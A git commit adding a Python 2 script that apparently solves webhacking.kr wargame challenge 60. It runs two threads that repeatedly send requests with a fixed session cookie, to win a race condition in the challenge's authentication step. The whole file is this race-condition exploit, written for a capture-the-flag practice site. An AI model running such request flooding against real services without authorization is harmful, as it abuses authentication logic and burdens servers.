ac6adfaefcc5a93502d01dd3c4d2378930cd26e5
bindon <bindon@Creator-Note>
2018-07-31 16:58:06 +0900

    Half Clear Challenge60

---
+++ Challenge60.py
@@ -0,0 +1,54 @@
+#-*- coding: utf-8 -*-
+import sys
+import threading
+import urllib2
+
+import CookieManager
+
+createThread = None
+def requestAuth():
+    while True:
+        challengeUrl = "http://webhacking.kr/challenge/web/web-37/index.php?mode=auth"
+        CookieManager.addCookie("PHPSESSID", "eabcdebaaabceddaabeabddefcabcdbe")
+        httpRequest = urllib2.Request(challengeUrl)
+        httpRequest.add_header("Cookie", CookieManager.getCookie())
+        
+        httpConnection = None
+        try:
+            httpConnection = urllib2.urlopen(httpRequest)
+            httpResponse = httpConnection.read()
+            sys.stdout.write("!")
+            if httpResponse.find("Done") >= 0:
+                print "[!] Clear Challenge 60"
+                createThread.__stop()
+                break
+        except:
+            raise
+        finally:
+            if httpConnection != None:
+                httpConnection.close()
+
+def requestCreate():
+    while True:
+        challengeUrl = "http://webhacking.kr/challenge/web/web-37/index.php"
+        CookieManager.addCookie("PHPSESSID", "eabcdebaaabceddaabeabddefcabcdbe")
+        httpRequest = urllib2.Request(challengeUrl)
+        httpRequest.add_header("Cookie", CookieManager.getCookie())
+        
+        httpConnection = None
+        try:
+            urllib2.urlopen(httpRequest)
+            sys.stdout.write(".")
+        except:
+            raise
+        finally:
+            if httpConnection != None:
+                httpConnection.close()
+
+print "[*] Start race condition"
+print "[*] create: ., auth: !"
+print "Progress:",
+createThread = threading.Thread(target=requestCreate)
+authThread = threading.Thread(target=requestAuth)
+createThread.start()
+authThread.start()
